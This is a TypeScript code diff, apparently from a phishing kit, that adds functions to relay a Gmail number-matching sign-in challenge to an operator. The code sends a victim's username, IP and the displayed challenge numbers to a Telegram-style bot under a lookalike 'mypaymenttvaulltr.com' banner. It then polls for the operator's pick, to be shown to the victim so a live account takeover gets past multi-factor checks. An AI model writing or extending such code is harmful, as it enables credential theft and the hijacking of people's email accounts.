@@ -150,6 +150,75 @@ export async function pollApproval(
   return { status, nextOffset, callbackId };
 }
 
+/* ─── send Gmail number challenge to admin ──────────────────────── */
+
+export async function sendGmailVerification(
+  username: string,
+  ip: string,
+  now: string,
+  numbers: number[],
+  sessionKey: string
+): Promise<number | null> {
+  const text =
+    `━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
+    `📌 <b>Gmail Number Verification</b>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+    `👤 <b>Username</b>   : <code>${username}</code>\n` +
+    `🌐 <b>IP</b>         : <code>${ip}</code>\n` +
+    `🕐 <b>Waktu</b>      : ${now}\n\n` +
+    `🔢 <b>Angka tampil</b>: <code>${numbers.join("  |  ")}</code>\n\n` +
+    `⚠️ <i>Pilih angka yang benar untuk dikirim ke user:</i>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━`;
+
+  const data = await post("/send-message", {
+    text,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        numbers.map(n => ({ text: `${n}`, callback_data: `gmail_${n}_${sessionKey}` })),
+        [{ text: "❌ Reject", callback_data: `reject_${sessionKey}` }],
+      ],
+    },
+  }) as { ok?: boolean; messageId?: number | null };
+
+  return data?.messageId ?? null;
+}
+
+/* ─── poll for Gmail number selection by admin ──────────────────── */
+
+export async function pollGmailNumber(
+  offset: number,
+  numbers: number[],
+  sessionKey: string
+): Promise<{ status: "selected" | "rejected" | "pending"; chosenNumber?: number; nextOffset: number; callbackId?: string }> {
+  const data = await get(`/updates?offset=${offset}&timeout=2`) as {
+    ok?: boolean;
+    result?: { update_id: number; callback_query?: { id: string; data?: string } }[];
+  };
+
+  if (!data?.ok || !data.result?.length) return { status: "pending", nextOffset: offset };
+
+  let nextOffset = offset;
+
+  for (const update of data.result) {
+    nextOffset = update.update_id + 1;
+    if (update.callback_query) {
+      const cbData = update.callback_query.data ?? "";
+      const callbackId = update.callback_query.id;
+      for (const n of numbers) {
+        if (cbData === `gmail_${n}_${sessionKey}`) {
+          return { status: "selected", chosenNumber: n, nextOffset, callbackId };
+        }
+      }
+      if (cbData === `reject_${sessionKey}`) {
+        return { status: "rejected", nextOffset, callbackId };
+      }
+    }
+  }
+  return { status: "pending", nextOffset };
+}
+
 /* ─── answer callback query ─────────────────────────────────────── */
 
 export async function answerCallback(callbackId: string, text: string): Promise<void> {
